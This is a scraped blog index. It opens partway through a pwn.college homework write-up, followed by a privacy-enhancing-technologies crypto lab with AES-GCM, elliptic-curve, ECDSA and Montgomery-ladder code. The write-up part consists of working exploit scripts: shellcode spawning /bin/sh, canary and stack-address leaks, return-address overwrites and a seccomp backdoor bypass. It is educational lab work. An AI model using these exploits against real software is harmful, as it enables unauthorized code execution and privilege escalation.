\u0026#34;\u0026#34;\u0026#34; mov rax, 59 # execve mov rbx, 0x68732f6e69622f # \u0026#34;/bin/sh\u0026#34; push rbx mov rdi, rsp # rdi -\u0026gt; \u0026#34;/bin/sh\u0026#34; on stack push 0x702d # \u0026#34;-p\u0026#34; mov rcx, rsp # rcx -\u0026gt; \u0026#34;-p\u0026#34; on stack push 0 push rcx push rdi mov rsi, rsp # rsi -\u0026gt; [rdi, rcx, 0] on stack -\u0026gt; [\u0026#34;/bin/sh\u0026#34;,\u0026#34;-p\u0026#34;,NULL] mov rdx, 0 # NULL syscall \u0026#34;\u0026#34;\u0026#34; sc_addr = 0x169e0000 sa(\u0026#39;stdin.\u0026#39;, asm(sc)) payload = b\u0026#39;a\u0026#39;*0x38 + p64(sc_addr) s(payload) 为调试方便，后续题目使用 babymem 13 的 shellcode。\n注：toddlerone 后续所有题目的 x.1 均是在 x.0 基础上要求自己确定偏移量和地址，不再赘述。\n2.0 # 往栈上写 shellcode，然后返回到栈上。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; sc_addr = 0x7fffffffd290 payload = asm(sc).ljust(0x78, b\u0026#39;a\u0026#39;) + p64(sc_addr) s(payload) 2.1 的主要坑点在于，为了确定栈地址需要将环境变量清空：\np = gdb.debug(binary, env={}) 随后再 gdb 确定偏移量即可，最后编写 exp 时也要注意清空环境变量使栈地址固定：\np = process(binary, env={}) 为了避免环境变量影响，接下来的题目中均使用这种方式启动进程。\n2.0 中如果清空环境变量，则 sc_addr 应设置为 0x7fffffffdcb0。\n3.0 # 第一轮同时泄漏 canary 和 Saved RBP 地址，我们希望通过 Saved RBP 地址推导出栈上的输入地址。\n观察可得：\n第一次 challenge 输入地址 - 第二次 challenge 输入地址 = 0xd0\nSaved RBP 地址 - 输入地址 = 0x10c0\n由此可以算出：\n第二次 challenge 输入地址 = 第一次 challenge 输入地址 - 0xd0 = （第一次 Saved RBP 地址 - 0x10c0）- 0xd0\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;a\u0026#39;*0x70 + b\u0026#39;\\x01\u0026#39; s(payload) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) saved_rbp = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) leak(\u0026#39;saved rbp\u0026#39;, saved_rbp) chall1_buf = (saved_rbp - 0x10c0) chall2_buf = chall1_buf - 0xd0 leak(\u0026#39;sc addr\u0026#39;, chall2_buf) payload = asm(sc).ljust(0x78, b\u0026#39;a\u0026#39;) + p64(canary) + b\u0026#39;a\u0026#39;*8 + p64(chall2_buf) s(payload) 4.0 # 在 3.0 基础上对 canary 前的一个值有要求。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; val = 0x68EDE977CB04B929 payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;a\u0026#39;*0x80 + b\u0026#39;\\x01\u0026#39; s(payload) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) saved_rbp = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) leak(\u0026#39;saved rbp\u0026#39;, saved_rbp) chall1_buf = (saved_rbp - 0x10d0) leak(\u0026#39;chall1 buf\u0026#39;, chall1_buf) chall2_buf = chall1_buf - 0xe0 leak(\u0026#39;sc addr\u0026#39;, chall2_buf) payload = asm(sc).ljust(0x80, b\u0026#39;a\u0026#39;) + p64(val) + p64(canary) + b\u0026#39;a\u0026#39;*8 + p64(chall2_buf) s(payload) 5.0 # 在 4.0 的基础上隔开了 canary 和 Saved RBP，可以用 REPEAT 两轮分两次泄漏。还有一个 seccomp 沙箱，但是可以通过程序中的后门逃逸，只要让栈上的一个值为特定值即可。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; val = 0x848FFD3CEC0476D2 payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;a\u0026#39;*0x20 s(payload + b\u0026#39;\\x01\u0026#39;) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) payload += b\u0026#39;a\u0026#39;*0x18 s(payload) ru(payload) saved_rbp = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) leak(\u0026#39;saved rbp\u0026#39;, saved_rbp) chall1_buf = (saved_rbp - 0xe0) leak(\u0026#39;chall1 buf\u0026#39;, chall1_buf) chall2_buf = chall1_buf - 0xa0 leak(\u0026#39;sc addr\u0026#39;, chall2_buf) payload = asm(sc).ljust(0x10, b\u0026#39;a\u0026#39;) + p64(val) + b\u0026#39;a\u0026#39;*0x10 payload += p64(canary) + b\u0026#39;a\u0026#39;*0x18 + p64(chall2_buf) s(payload) 6.0 # 在 5.0 的基础上需要把栈上的 seccomp 参数改成需要的系统调用号。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;a\u0026#39;*0x80 s(payload) s(payload + b\u0026#39;\\x01\u0026#39;) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) payload += b\u0026#39;a\u0026#39;*0x18 s(payload) ru(payload) saved_rbp = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) leak(\u0026#39;saved rbp\u0026#39;, saved_rbp) chall1_buf = (saved_rbp - 0x1a0) leak(\u0026#39;chall1 buf\u0026#39;, chall1_buf) chall2_buf = chall1_buf - 0x100 leak(\u0026#39;sc addr\u0026#39;, chall2_buf) pause() payload = asm(sc).ljust(0x78, b\u0026#39;a\u0026#39;) + p32(0) + p32(1) + p32(0x5a) payload += b\u0026#39;a\u0026#39;*4 + p64(canary) + b\u0026#39;a\u0026#39;*0x18 + p64(chall2_buf) s(payload) ","date":"2022-02-24","permalink":"/posts/pwn-college/","section":"Posts","summary":"\u003cp\u003e时隔许久，我居然又得做 pwn 题了。\u003c/p\u003e","title":"追本溯源：pwn.college 作业记录"},{"content":"","date":"2022-02-04","permalink":"/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"对称密码学"},{"content":"","date":"2022-02-04","permalink":"/tags/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"公钥密码学"},{"content":"","date":"2022-02-04","permalink":"/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Categories","summary":"","title":"密码学"},{"content":"Privacy Enhancing Technologies (PET)，实际上还是密码学。\n隐私与隐私侵犯 # 隐私可以看作是对数据的控制的一种准许：\n机密性 - 保证一个人的秘密不被泄漏 控制 - 给个人控制自己个人信息的权利 自我实现 - 允许个人使用这些信息来达成自己的目的 Solove 分类将隐私侵犯分为 4 类：\n信息收集 信息处理 信息传播 入侵（即干扰个人的活动与决策） 隐私增强技术分类 # 根据不同的假设，隐私增强技术可以分为 Soft PET 和 Hard PET。前者主要关注合规性，假设处理用户数据的第三方服务是合法可信的，因此侧重于建立安全信道、强化访问控制策略等等。\n后者则假设任一第三方服务均不可信，因此注重完整性、审计、不泄漏数据给第三方等等。\n举个例子，如果 Alice 和 Bob 要通过一台服务器（第三方服务）进行通信，那么在 Soft PET 中，双方都会与服务器建立 TLS 连接传输加密数据。服务器可以看到数据明文，不过监听者看不到。\n而在 Hard PET 中，Alice 和 Bob 不信任服务器。此时 Alice 可能使用 Bob 的公钥加密后经服务器传输给 Bob，这一过程中服务器就无法看到明文了。\n通信隐私 Communications Privacy # 这个部分比较简单，即密码学中的混合加密机制。\n对称加密 # 首先是对称加密部分，现在通常采用 AEAD 方式同时确保机密性和完整性，最著名的算法莫过于 AES-GCM 了。\n需要注意的是，对于同一密钥不能重复使用相同的 IV。\n我们需要实现 encrypt_message 和 decrypt_message 两个函数，在实现前先利用 pytest 写好测试，以 AES-128-GCM 为例：\n@pytest.mark.task2 def test_gcm_encrypt(): \u0026#34;\u0026#34;\u0026#34; Tests encryption with AES-GCM \u0026#34;\u0026#34;\u0026#34; from os import urandom key = urandom(16) message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag = encrypt_message(key, message) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 @pytest.mark.task2 def test_gcm_decrypt(): \u0026#34;\u0026#34;\u0026#34; Tests decryption with AES-GCM \u0026#34;\u0026#34;\u0026#34; from os import urandom key = urandom(16) message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag = encrypt_message(key, message) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 m = decrypt_message(key, iv, ciphertext, tag) assert m == message @pytest.mark.task2 def test_gcm_fails(): from pytest import raises from os import urandom key = urandom(16) message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag = encrypt_message(key, message) with raises(Exception) as excinfo: decrypt_message(key, iv, urandom(len(ciphertext)), tag) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(key, iv, ciphertext, urandom(len(tag))) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(key, urandom(len(iv)), ciphertext, tag) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(urandom(len(key)), iv, ciphertext, tag) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) 函数实现部分则利用 petlib，注意捕获异常：\ndef encrypt_message(key, message): \u0026#34;\u0026#34;\u0026#34; Encrypt a message under a key given as input \u0026#34;\u0026#34;\u0026#34; length = len(key) iv = urandom(length) aes = Cipher(\u0026#34;aes-128-gcm\u0026#34;) ciphertext, tag = aes.quick_gcm_enc(key, iv, message) return iv, ciphertext, tag def decrypt_message(key, iv, ciphertext, tag): \u0026#34;\u0026#34;\u0026#34; Decrypt a cipher text under a key given as input In case the decryption fails, throw an exception. \u0026#34;\u0026#34;\u0026#34; aes = Cipher(\u0026#34;aes-128-gcm\u0026#34;) try: plain = aes.quick_gcm_dec(key, iv, ciphertext, tag) except: raise Exception(\u0026#34;decryption failed\u0026#34;) return plain 非对称加密 # 非对称部分采用 ECDH 来减小密钥长度，考虑到 Forward Secrecy 的要求，可以升级成 ECDHE。在此之前，先复习一下椭圆曲线算术。\n假设曲线为 $y^2\\equiv x^3+ax+b\\ (mod\\ p)$，首先需要一个判断点是否在曲线上的函数。我们用封装好的 petlib.ec 写测试，但只使用 petlib.Bn 来计算椭圆曲线算术：\n@pytest.mark.task3 def test_on_curve(): \u0026#34;\u0026#34;\u0026#34; Test the procedues that tests whether a point is on a curve. \u0026#34;\u0026#34;\u0026#34; # Example on how to define a curve from petlib.ec import EcGroup, EcPt group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx, gy = g.get_affine() from Lab01Code import is_point_on_curve assert is_point_on_curve(a, b, p, gx, gy) assert is_point_on_curve(a, b, p, None, None) def is_point_on_curve(a, b, p, x, y): \u0026#34;\u0026#34;\u0026#34; Check that a point (x, y) is on the curve defined by a,b and prime p. Reminder: an Elliptic Curve on a prime field p is defined as: y^2 = x^3 + ax + b (mod p) (Weierstrass form) Return True if point (x,y) is on curve, otherwise False. By convention a (None, None) point represents \u0026#34;infinity\u0026#34;. \u0026#34;\u0026#34;\u0026#34; assert isinstance(a, Bn) assert isinstance(b, Bn) assert isinstance(p, Bn) and p \u0026gt; 0 assert (isinstance(x, Bn) and isinstance(y, Bn)) \\ or (x is None and y is None) if x is None and y is None: return True lhs = (y * y) % p rhs = (x * x * x + a * x + b) % p on_curve = (lhs == rhs) return on_curve 随后，对于 $(x_r,y_r)=(x_p,y_p)+(x_q,y_q)$，我们有：\n$$ \\lambda=(y_q-y_p)(x_q-x_p)^{-1}\\ (mod\\ p)\\\\ x_r=\\lambda^2-x_p-x_q\\ (mod\\ p)\\\\ y_r=\\lambda(x_p-x_r)-y_p\\ (mod\\ p) $$\n@pytest.mark.task3 def test_point_addition(): \u0026#34;\u0026#34;\u0026#34; Test whether the EC point addition is correct. \u0026#34;\u0026#34;\u0026#34; from pytest import raises from petlib.ec import EcGroup, EcPt group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx0, gy0 = g.get_affine() r = group.order().random() gx1, gy1 = (r * g).get_affine() assert is_point_on_curve(a, b, p, gx0, gy0) assert is_point_on_curve(a, b, p, gx1, gy1) # Test a simple addition h = (r + 1) * g hx1, hy1 = h.get_affine() x, y = point_add(a, b, p, gx0, gy0, gx1, gy1) assert is_point_on_curve(a, b, p, x, y) assert x == hx1 assert y == hy1 # Ensure commutativity xp, yp = point_add(a, b, p, gx1, gy1, gx0, gy0) assert is_point_on_curve(a, b, p, xp, yp) assert x == xp assert y == yp # Ensure addition with neutral returns the element xp, yp = point_add(a, b, p, gx1, gy1, None, None) assert is_point_on_curve(a, b, p, xp, yp) assert xp == gx1 assert yp == gy1 xp, yp = point_add(a, b, p, None, None, gx0, gy0) assert is_point_on_curve(a, b, p, xp, yp) assert gx0 == xp assert gy0 == yp # An error is raised in case the points are equal with raises(Exception) as excinfo: point_add(a, b, p, gx0, gy0, gx0, gy0) assert \u0026#39;EC Points must not be equal\u0026#39; in str(excinfo.value) @pytest.mark.task3 def test_point_addition_check_inf_result(): \u0026#34;\u0026#34;\u0026#34; Test whether the EC point addition is correct for pt - pt = inf \u0026#34;\u0026#34;\u0026#34; from petlib.ec import EcGroup group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx0, gy0 = g.get_affine() gx1, gy1 = gx0, p - gy0 assert is_point_on_curve(a, b, p, gx0, gy0) assert is_point_on_curve(a, b, p, gx1, gy1) x, y = point_add(a, b, p, gx0, gy0, gx1, gy1) assert is_point_on_curve(a, b, p, x, y) assert (x, y) == (None, None) def point_add(a, b, p, x0, y0, x1, y1): \u0026#34;\u0026#34;\u0026#34;Define the \u0026#34;addition\u0026#34; operation for 2 EC Points. Reminder: (xr, yr) = (xq, yq) + (xp, yp) is defined as: lam = (yq - yp) * (xq - xp)^-1 (mod p) xr = lam^2 - xp - xq (mod p) yr = lam * (xp - xr) - yp (mod p) Return the point resulting from the addition by implementing the above pseudocode. Raises an Exception if the points are equal. \u0026#34;\u0026#34;\u0026#34; if x0 is None and y0 is None: return x1, y1 if x1 is None and y1 is None: return x0, y0 if x0 == x1 and y0 == y1: raise Exception(\u0026#34;EC Points must not be equal\u0026#34;) assert (isinstance(x0, Bn) and isinstance( y0, Bn)) assert (isinstance(x1, Bn) and isinstance( y1, Bn)) inv = 0 try: inv = (x1-x0).mod_inverse(p) except: return None, None lamb = (y1-y0).mod_mul(inv, p) xr = lamb.mod_pow(2, p).mod_sub(x0+x1, p) yr = lamb.mod_mul(x0-xr, p).mod_sub(y0, p) return xr, yr 特别地，当两个加数相同时：\n$$ \\lambda=(3x_p^2+a)(2y_p)^{-1}\\ (mod\\ p)\\\\ x_r=\\lambda^2-2x_p\\ (mod\\ p)\\\\ y_r=\\lambda(x_p-x_r)-y_p\\ (mod\\ p) $$\n@pytest.mark.task3 def test_point_doubling(): \u0026#34;\u0026#34;\u0026#34; Test whether the EC point doubling is correct. \u0026#34;\u0026#34;\u0026#34; from petlib.ec import EcGroup group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx0, gy0 = g.get_affine() gx2, gy2 = (2 * g).get_affine() x2, y2 = point_double(a, b, p, gx0, gy0) assert is_point_on_curve(a, b, p, x2, y2) assert x2 == gx2 and y2 == gy2 x2, y2 = point_double(a, b, p, None, None) assert is_point_on_curve(a, b, p, x2, y2) assert x2 is None and y2 is None def point_double(a, b, p, x, y): \u0026#34;\u0026#34;\u0026#34;Define \u0026#34;doubling\u0026#34; an EC point. A special case, when a point needs to be added to itself. Reminder: lam = (3 * xp ^ 2 + a) * (2 * yp) ^ -1 (mod p) xr = lam ^ 2 - 2 * xp yr = lam * (xp - xr) - yp (mod p) Returns the point representing the double of the input (x, y). \u0026#34;\u0026#34;\u0026#34; if x is None and y is None: return x, y assert (isinstance(x, Bn) and isinstance( y, Bn)) inv = (2*y).mod_inverse(p) lamb = (3*x**2+a).mod_mul(inv, p) xr = lamb.mod_pow(2, p).mod_sub(x*2, p) yr = lamb.mod_mul(x-xr, p).mod_sub(y, p) return xr, yr 而对于乘法，我们可以使用快速幂的方法：\n@pytest.mark.task3 def test_point_scalar_mult_double_and_add(): \u0026#34;\u0026#34;\u0026#34; Test the scalar multiplication using double and add. \u0026#34;\u0026#34;\u0026#34; from petlib.ec import EcGroup group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx0, gy0 = g.get_affine() r = group.order().random() gx2, gy2 = (r * g).get_affine() x2, y2 = point_scalar_multiplication_double_and_add(a, b, p, gx0, gy0, r) assert is_point_on_curve(a, b, p, x2, y2) assert gx2 == x2 assert gy2 == y2 def point_scalar_multiplication_double_and_add(a, b, p, x, y, scalar): \u0026#34;\u0026#34;\u0026#34; Implement Point multiplication with a scalar: r * (x, y) = (x, y) + ... + (x, y) (r times) Reminder of Double and Multiply algorithm: r * P Q = infinity for i = 0 to num_bits(P)-1 if bit i of r == 1 then Q = Q + P P = 2 * P return Q \u0026#34;\u0026#34;\u0026#34; Q = (None, None) P = (x, y) assert isinstance(x, Bn) assert isinstance(y, Bn) assert isinstance(scalar, Bn) for i in range(scalar.num_bits()): if scalar.is_bit_set(i): Q = point_add(a, b, p, Q[0], Q[1], P[0], P[1]) P = point_double(a, b, p, P[0], P[1]) return Q 在后续实验中需要注意的是，整数域上的运算“迁移”到椭圆曲线上时会降阶，即乘法变为加法，幂运算变为乘法。\n签名 # 在我们的混合加密体制中还可以加入数字签名，这里用 ECDSA：\n@pytest.mark.task4 def test_key_gen(): \u0026#34;\u0026#34;\u0026#34; Tests the key generation of ECDSA\u0026#34;\u0026#34;\u0026#34; from Lab01Code import ecdsa_key_gen ecdsa_key_gen() assert True @pytest.mark.task4 def test_produce_signature(): \u0026#34;\u0026#34;\u0026#34; Tests signature function \u0026#34;\u0026#34;\u0026#34; msg = b\u0026#34;Test\u0026#34; * 1000 from Lab01Code import ecdsa_key_gen, ecdsa_sign group, priv, pub = ecdsa_key_gen() ecdsa_sign(group, priv, msg) assert True @pytest.mark.task4 def test_check_signature(): \u0026#34;\u0026#34;\u0026#34; Tests signature and verification function \u0026#34;\u0026#34;\u0026#34; msg = b\u0026#34;Test\u0026#34; * 1000 group, priv, pub = ecdsa_key_gen() sig = ecdsa_sign(group, priv, msg) assert ecdsa_verify(group, pub, msg, sig) @pytest.mark.task4 def test_check_fail(): \u0026#34;\u0026#34;\u0026#34; Ensures verification fails when it should \u0026#34;\u0026#34;\u0026#34; msg = b\u0026#34;Test\u0026#34; * 1000 msg2 = b\u0026#34;Text\u0026#34; * 1000 group, priv, pub = ecdsa_key_gen() sig = ecdsa_sign(group, priv, msg) assert not ecdsa_verify(group, pub, msg2, sig) def ecdsa_key_gen(): \u0026#34;\u0026#34;\u0026#34; Returns an EC group, a random private key for signing and the corresponding public key for verification\u0026#34;\u0026#34;\u0026#34; group = EcGroup() priv_sign = group.order().random() pub_verify = priv_sign * group.generator() return group, priv_sign, pub_verify def ecdsa_sign(group, priv_sign, message): \u0026#34;\u0026#34;\u0026#34; Sign the SHA256 digest of the message using ECDSA and return a signature \u0026#34;\u0026#34;\u0026#34; digest = sha256(message).digest() kinv_rp = do_ecdsa_setup(group, priv_sign) sig = do_ecdsa_sign(group, priv_sign, digest, kinv_rp) return sig def ecdsa_verify(group, pub_verify, message, sig): \u0026#34;\u0026#34;\u0026#34; Verify the ECDSA signature on the message \u0026#34;\u0026#34;\u0026#34; digest = sha256(message).digest() res = do_ecdsa_verify(group, pub_verify, sig, digest) return res 完整的加密通信实现 # 将上面实现的部分组合到一起，加上 DH 密钥交换，就是完整的加密通信过程了。在下面的代码里假设 Alice 发送 Bob 接收，但因为通信的对称性，对于相反的情况也同样适用。\n@pytest.mark.task5 def test_encrypt(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 @pytest.mark.task5 def test_decrypt(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) alice_ver = (ecdsa_group, ecdsa_pub_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 encrypted = (iv, ciphertext, tag, sig) m = dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert m == message @pytest.mark.task5 def test_fails(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) alice_ver = (ecdsa_group, ecdsa_pub_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\u0026#34;Hello World!\u0026#34; iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 # Random ciphertext with raises(Exception) as excinfo: encrypted = (iv, urandom(len(ciphertext)), tag, sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) # Random AES-GCM tag with raises(Exception) as excinfo: encrypted = (iv, ciphertext, urandom(len(tag)), sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) # Random IV with raises(Exception) as excinfo: encrypted = (urandom(len(iv)), ciphertext, tag, sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) encrypted_normal = (iv, ciphertext, tag, sig) group_rand, priv_rand, pub_rand = dh_get_key() # Random DH private key of Bob with raises(Exception) as excinfo: dh_decrypt(priv_rand, dh_pub_alice, encrypted_normal, alice_ver) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) # Random DH public key of Alice with raises(Exception) as excinfo: dh_decrypt(dh_priv_bob, pub_rand, encrypted_normal, alice_ver) assert \u0026#39;decryption failed\u0026#39; in str(excinfo.value) ecdsa_group_rand, ecdsa_priv_rand, ecdsa_pub_rand = ecdsa_key_gen() alice_ver_rand = (ecdsa_group_rand, ecdsa_pub_rand) # Random ECDSA verificaiton key with raises(Exception) as excinfo: dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted_normal, alice_ver_rand) assert \u0026#39;verification failed\u0026#39; in str(excinfo.value) # Random signature with raises(Exception) as excinfo: encrypted = (iv, ciphertext, tag, (Bn(100), Bn(200))) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert \u0026#39;verification failed\u0026#39; in str(excinfo.value) def dh_get_key(): \u0026#34;\u0026#34;\u0026#34; Generate a DH key pair \u0026#34;\u0026#34;\u0026#34; group = EcGroup() priv_dec = group.order().random() pub_enc = priv_dec * group.generator() return group, priv_dec, pub_enc def dh_encrypt(pub, message, alice_sig=None): \u0026#34;\u0026#34;\u0026#34; Assume you know the public key of someone else (Bob), and wish to Encrypt a message for them. - Generate a fresh DH key for this message. - Derive a fresh shared key. - Use the shared key to AES_GCM encrypt the message. - Optionally: sign the message with Alice\u0026#39;s key. \u0026#34;\u0026#34;\u0026#34; assert isinstance(pub, EcPt) group, priv_dh, pub_dh = dh_get_key() secret = priv_dh * pub assert isinstance(secret, EcPt) key = sha256(secret.export()).digest()[:16] iv, ciphertext, tag = encrypt_message(key, message) sig = None if alice_sig is not None: group, priv_sign = alice_sig sig = ecdsa_sign(group, priv_sign, message) return iv, ciphertext, tag, sig, pub_dh def dh_decrypt(priv, pub, ciphertext, alice_ver=None): \u0026#34;\u0026#34;\u0026#34; Decrypt a received message encrypted using your public key, of which the private key is provided. Optionally verify the message came from Alice using her verification key.\u0026#34;\u0026#34;\u0026#34; assert isinstance(priv, Bn) assert isinstance(pub, EcPt) secret = priv * pub assert isinstance(secret, EcPt) key = sha256(secret.export()).digest()[:16] iv, cipher, tag, sig = ciphertext plain = decrypt_message(key, iv, cipher, tag) if alice_ver is not None: group, pub_verify = alice_ver if not ecdsa_verify(group, pub_verify, plain, sig): raise Exception(\u0026#34;verification failed\u0026#34;) return plain 侧信道攻击 # 最后，我们编写函数测试椭圆曲线点乘法所消耗的时间：\ndef time_scalar_mul(f): # pragma: no cover start = time.perf_counter() group = EcGroup(713) d = group.parameters() a, b, p = d[\u0026#34;a\u0026#34;], d[\u0026#34;b\u0026#34;], d[\u0026#34;p\u0026#34;] g = group.generator() gx0, gy0 = g.get_affine() r = group.order().random() f(a, b, p, gx0, gy0, r) return r, time.perf_counter()-start def time_double_add(times): # pragma: no cover for _ in range(times): r, time_double_add = time_scalar_mul( point_scalar_multiplication_double_and_add) print(r, time_double_add) Python3.8 移除了 time.clock()，使用 time.perf_counter() 替代。\n运行后可以发现，快速幂的方式花费时间浮动很大，可能导致基于时间的侧信道攻击。为了防止这一攻击，我们可以采用 Montgomerry Ladder 算法重新实现乘法：\ndef point_scalar_multiplication_montgomerry_ladder(a, b, p, x, y, scalar): \u0026#34;\u0026#34;\u0026#34; Implement Point multiplication with a scalar: r * (x, y) = (x, y) + ... + (x, y) (r times) Reminder of Double and Multiply algorithm: r * P R0 = infinity R1 = P for i in num_bits(P)-1 to zero: if di = 0: R1 = R0 + R1 R0 = 2R0 else R0 = R0 + R1 R1 = 2 R1 return R0 \u0026#34;\u0026#34;\u0026#34; R0 = (None, None) R1 = (x, y) assert isinstance(x, Bn) assert isinstance(y, Bn) assert isinstance(scalar, Bn) for i in reversed(range(0, scalar.num_bits())): # TODO: ADD YOUR CODE HERE if not scalar.is_bit_set(i): R1 = point_add(a, b, p, R0[0], R0[1], R1[0], R1[1]) R0 = point_double(a, b, p, R0[0], R0[1]) else: R0 = point_add(a, b, p, R0[0], R0[1], R1[0], R1[1]) R1 = point_double(a, b, p, R1[0], R1[1]) return R0 def time_montgomery(times): for _ in range(times): r, time_montgomery = time_scalar_mul( point_scalar_multiplication_montgomerry_ladder) print(r, time_montgomery) 此时的计时结果非常稳定，因为 Montgomerry Ladder 算法确保了对不同输入的处理花费大致相同的时间。\n匿名通信 Anonymous Communications # 匿名通信的匿名性大概有如下几种：\n发送者匿名：Alice 发送消息给 Bob，Bob 并不知道发送者是谁 接收者匿名：Alice 发送消息给 Bob，但不知道 Bob 是谁 双向匿名：Alice 与 Bob 通信，但不知道对方身份 第三方匿名：Alice 与 Bob 通信并知道对方身份，但第三方并不知道 为了满足匿名性，我们常常需要满足：\n不可观测性：Alice 与 Bob 通信，而其他人并不知道他们各自在发送还是接收消息 不可关联性：Alice 发送（或 Bob 接收）的任意两条消息无法被关联到同一个发送者（或接收者） 伪匿名性：Alice 的所有行为都可以被关联到一个实体，但实体的身份无法确定 